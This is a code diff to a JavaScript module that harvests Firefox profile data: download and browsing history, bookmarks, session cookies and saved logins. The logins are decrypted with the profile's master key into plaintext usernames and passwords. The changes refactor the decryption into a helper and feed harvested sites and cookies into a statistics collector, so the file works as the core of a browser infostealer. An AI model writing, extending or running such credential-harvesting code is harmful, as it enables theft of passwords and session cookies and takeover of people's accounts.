@@ -3,14 +3,21 @@ const path = require("path");
 const iconv = require("iconv-lite");
 
 const structures = require("./structures");
-const cryptofy = require('./crypto.js');
+const cryptofy = require('./cryptofy.js');
 const query = require("./query.js");
 
-const ALL_SITES_VISITEDS = [];
-
 class Gecko {
-    GetSites = () => {
-        return ALL_SITES_VISITEDS;
+    decrypt = (encryptedPass, masterKey) => {
+        const decryptedData = cryptofy.decryptedData(
+            cryptofy.decodeB64ASN1Data(encryptedPass).data,
+            cryptofy.decodeB64ASN1Data(encryptedPass).iv,
+            masterKey,
+            "3DES-CBC"
+        );
+
+        const decryptedString = iconv.encode(decryptedData.data, "latin1").toString();
+
+        return decryptedString;
     };
 
     GetMasterKey = async (geckoPathProfile, masterPassword) => {
@@ -52,28 +59,27 @@ class Gecko {
         try {
             const rows = await sqliteQuery.execute('SELECT GROUP_CONCAT(content) AS content, url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id = moz_places.id) t GROUP BY place_id');
 
-            return rows.map(row => {
-                const rowContentString = row.content;
-                const matchFilePath = rowContentString.match(/file:\/\/\/(.*?),/);
-                if (!matchFilePath) return null;
+            return rows.map(({ content, url }) => {
+                const objectRegex = /,(.*)/;
+                const fileRegex = /file:\/\/\/(.*?),/;
 
-                const rowFilePath = matchFilePath[1];
+                const objectMatch = objectRegex.exec(content);
+                const fileMatch = fileRegex.exec(content);
 
-                const jsonStringMatch = rowContentString.match(/,(.*)/);
-                if (!jsonStringMatch || jsonStringMatch.length < 2) return null;
+                if (fileMatch && objectMatch) {
+                    let parsedJson;
+                    try {
+                        parsedJson = JSON.parse(objectMatch[1]);
+                    } catch (error) {
+                        return null;
+                    };
 
-                let rowObjectJson;
-                try {
-                    rowObjectJson = JSON.parse(jsonStringMatch[1]);
-                } catch (error) {
-                    return null;
+                    return new structures.Download(
+                        url,
+                        fileMatch[1],
+                        parsedJson?.fileSize
+                    );
                 }
-
-                return new structures.Download(
-                    row.url,
-                    rowFilePath,
-                    rowObjectJson.fileSize
-                );
             }).filter(Boolean);
         } catch (error) {
             return [];
@@ -87,14 +93,14 @@ class Gecko {
         const sqliteQuery = new query.SqliteQuery(PlacesDbFilePath);
 
         try {
-            const rows = await sqliteQuery.execute('SELECT url, title, visit_count, last_visit_date FROM moz_places where title not null');
+            const rows = await sqliteQuery.execute('SELECT * FROM moz_places where title not null');
 
-            return rows.map(row => {
+            return rows.map(({ url, title, visit_count, last_visit_date }) => {
                 return new structures.History(
-                    row.url,
-                    row.title,
-                    row.visit_count,
-                    row.last_visit_date
+                    url,
+                    title,
+                    visit_count,
+                    last_visit_date
                 )
             }).filter(Boolean);
         } catch (error) {
@@ -109,13 +115,13 @@ class Gecko {
         const sqliteQuery = new query.SqliteQuery(PlacesDbFilePath);
 
         try {
-            const rows = await sqliteQuery.execute('SELECT url, title, dateAdded, id FROM (SELECT * FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk=moz_places.id)');
+            const rows = await sqliteQuery.execute('SELECT * FROM (SELECT * FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk=moz_places.id)');
 
-            return rows.map(row => {
+            return rows.map(({ url, title, dateAdded }) => {
                 return new structures.Bookmark(
-                    row.url,
-                    row.title,
-                    row.dateAdded
+                    url,
+                    title,
+                    dateAdded
                 )
             }).filter(Boolean);
         } catch (error) {
@@ -134,35 +140,20 @@ class Gecko {
             const loginsObjectJson = JSON.parse(fs.readFileSync(LoginsFileTempPath, "utf8"));
 
             return loginsObjectJson?.logins.map(({ encryptedUsername, encryptedPassword, hostname, timeLastUsed }) => {
-                const username = cryptofy.decryptedData(
-                    cryptofy.decodeB64ASN1Data(encryptedUsername).data,
-                    cryptofy.decodeB64ASN1Data(encryptedUsername).iv,
-                    MasterKey,
-                    "3DES-CBC"
-                );
 
-                const password = cryptofy.decryptedData(
-                    cryptofy.decodeB64ASN1Data(encryptedPassword).data,
-                    cryptofy.decodeB64ASN1Data(encryptedPassword).iv,
-                    MasterKey,
-                    "3DES-CBC"
-                );
+                const decryptedUser = this.decrypt(encryptedUsername, MasterKey);
+                const decryptedPass = this.decrypt(encryptedPassword, MasterKey);
 
-                const [encodedUsername, encodedPassword] = [
-                    iconv.encode(username.data, "latin1").toString(),
-                    iconv.encode(password.data, "latin1").toString()
-                ];
-
-                if (username.data && password.data) {
-                    ALL_SITES_VISITEDS.push({
+                if (decryptedUser && decryptedPass) {
+                    structures.BrowserStatistics.addSites({
                         source: 'logins',
                         origin_url: hostname
                     });
 
                     return new structures.Login(
                         hostname,
-                        encodedUsername,
-                        encodedPassword,
+                        decryptedUser,
+                        decryptedPass,
                         timeLastUsed
                     )
                 };
@@ -186,30 +177,30 @@ class Gecko {
         const sqliteQuery = new query.SqliteQuery(CookieFilePath);
 
         try {
-            const rows = await sqliteQuery.execute('SELECT host, path, isSecure, expiry, name, value FROM moz_cookies');
+            const rows = await sqliteQuery.execute('SELECT * FROM moz_cookies');
 
-            return rows.map(row => {
-                ALL_SITES_VISITEDS.push({
+            return rows.map(({ host, path, isSecure, expiry, name, value }) => {
+                structures.BrowserStatistics.addSites({
                     source: 'cookies',
-                    origin_url: row.host
+                    origin_url: host
                 });
-                
+
                 structures.BrowserStatistics.addCookies({
-                    host_key: row.host,
-                    path: row.path,
-                    is_secure: row.isSecure,
-                    expires_utc: row.expiry,
-                    name: row.name,
-                    value: row.value
+                    host_key: host,
+                    path: path,
+                    is_secure: isSecure,
+                    expires_utc: expiry,
+                    name: name,
+                    value: value
                 });
 
                 return new structures.Cookie(
-                    row.host,
-                    row.path,
-                    row.isSecure,
-                    row.expiry,
-                    row.name,
-                    row.value
+                    host,
+                    path,
+                    isSecure,
+                    expiry,
+                    name,
+                    value
                 )
             }).filter(Boolean);
         } catch (error) {
